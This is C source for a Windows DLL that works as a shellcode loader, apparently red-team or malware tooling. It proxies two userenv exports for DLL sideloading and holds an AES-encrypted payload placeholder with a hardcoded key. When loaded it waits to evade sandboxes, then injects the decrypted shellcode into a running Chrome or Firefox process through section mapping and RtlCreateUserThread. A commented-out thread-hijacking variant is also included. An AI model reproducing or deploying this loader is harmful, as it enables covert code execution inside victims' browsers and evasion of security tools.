#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#define UNICODE
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include "helpers.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

#pragma comment(linker,"/export:CreateEnvironmentBlock=GDyn.CreateEnvironmentBlock,@3")
#pragma comment(linker,"/export:DestroyEnvironmentBlock=GDyn.DestroyEnvironmentBlock,@10")

unsigned char reload[] = {0xd0}; // Your AES/XOR/RC4 Payload here - could also use .h header as to read the payload or a remote stager. 
unsigned char key[] = { 0xd0, 0x2a, 0x5a, 0x82, 0x59, 0x81, 0xd9, 0xb6, 0xda, 0x51, 0xf4, 0x34, 0x32, 0xee, 0x77, 0xe }; 
int reload_len = sizeof(reload);


// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect);
	
typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length);

typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientId);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html#l00186
typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
	PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html
typedef NTSTATUS (NTAPI * NtCreateSection_t)(
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL); 

// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection
// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html
typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID * BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);
	
// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, *PSECTION_INHERIT;	


int AESDecrypt(char * reload, unsigned int reload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) reload, (DWORD *) &reload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


/*
int FindProc(LPCWSTR procname){

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
					if (lstrcmpiW(procname, pe32.szExeFile) == 0) {
                    pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}
*/


int FindProc(LPCWSTR procname){


        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiW(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


HANDLE FindThread(int pid){

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		
	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) 	{
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	return hThread;
}




/*
int CTX(HANDLE hProc, int pid, unsigned char * reload, unsigned int reload_len) {

	HANDLE hThread = NULL;
	LPVOID pRemoteCode = NULL;
	CONTEXT ctx;

	hThread = FindThread(pid);
	if (hThread == NULL) {
		return -1;
	}

	// Decrypt reload
	AESDecrypt((char *) reload, reload_len, (char *) key, sizeof(key));
		
	WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "WriteProcessMemory");
	
	VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAllocEx");
	//NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), n
	
	// perform reload injection
	pRemoteCode = pVirtualAllocEx(hProc, NULL, reload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	pWriteProcessMemory(hProc, pRemoteCode, (PVOID) reload, (SIZE_T) reload_len, (SIZE_T *) NULL);

	GetThreadContext_t pGetThreadContext = (GetThreadContext_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetThreadContext");

	SetThreadContext_t  pSetThreadContext = (SetThreadContext_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "SetThreadContext");
	
	SuspendThread(hThread);	
	ctx.ContextFlags = CONTEXT_FULL;
	pGetThreadContext(hThread, &ctx);
#ifdef _M_IX86 
	ctx.Eip = (DWORD_PTR) pRemoteCode;
#else
	ctx.Rip = (DWORD_PTR) pRemoteCode;
#endif
	pSetThreadContext(hThread, &ctx);
	
	return ResumeThread(hThread);	
}

*/


// map section views injection
int ReviewVIEW(HANDLE hProc,int pid,unsigned char * reload, unsigned int reload_len) {

	HANDLE hSection = NULL;
	PVOID pLocalView = NULL, pRemoteView = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;

	
	
	// create memory section
	NtCreateSection_t pNtCreateSection = (NtCreateSection_t)hlpGetProcAddress(hlpGetModuleHandle(L"NTDLL.DLL"), "NtCreateSection");
			
	if (pNtCreateSection == NULL)
		return -2;
	

	
	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &reload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// create local section view
	NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t)hlpGetProcAddress(hlpGetModuleHandle(L"NTDLL.DLL"), "NtMapViewOfSection");
	
	if (pNtMapViewOfSection == NULL)
		return -2;
	
	pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &reload_len, ViewUnmap, NULL, PAGE_READWRITE);

	// throw the reload into the section
	memcpy(pLocalView, reload, reload_len);
	
	// create remote section view (target process)
	pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &reload_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);

	//printf("wait: pload = %p ; rview = %p ; lview = %p\n", reload, pRemoteView, pLocalView);
	//getchar();

		
	// execute the reload
	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t)hlpGetProcAddress(hlpGetModuleHandle(L"NTDLL.DLL"),"RtlCreateUserThread");
		
	if (pRtlCreateUserThread == NULL)
		return -2;
	pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, pRemoteView, 0, &hThread, &cid);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}


int Try(void){
	
	int pid  = FindProc(L"chrome.exe");
	
	if (!pid){
		pid = FindProc(L"firefox.exe");
	}
	HANDLE hProc = NULL;
	
	if (pid) {

		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Sleep(1*13000);
			AESDecrypt((char *) reload, reload_len, (char *) key, sizeof(key));
			ReviewVIEW(hProc,pid,reload,reload_len);
			CloseHandle(hProc);
		}
	}else{
			//Sleep(5*20000);
			
		}
	return 0;
}



BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		Try();
		break;
   
    }
    return TRUE;
}






